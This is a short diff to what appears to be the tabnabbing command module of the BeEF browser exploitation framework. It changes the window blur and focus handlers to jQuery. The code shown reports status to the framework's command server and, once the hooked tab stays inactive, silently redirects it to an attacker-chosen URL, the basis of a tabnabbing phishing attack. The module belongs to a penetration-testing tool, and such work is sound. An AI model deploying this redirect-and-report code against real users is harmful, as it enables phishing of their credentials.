@@ -13,14 +13,13 @@ beef.execute(function() {
 	beef.net.send('<%= @command_url %>', <%= @command_id %>, 'tabnab=waiting for tab to become inactive');
 
 	// begin countdown when the tab loses focus
-	window.onblur = function() {
+	$j(window).blur(function(e) {
 		begin_countdown();
-	}
 
 	// stop countdown if the tab regains focus
-	window.onfocus = function() {
+	}).focus(function(e) {
 		clearTimeout(tabnab_timer);
-	}
+	});
 
 	begin_countdown = function() {
 		tabnab_timer = setTimeout(function() { beef.net.send('<%= @command_url %>', <%= @command_id %>, 'tabnab=redirected'); window.location = url; }, wait);
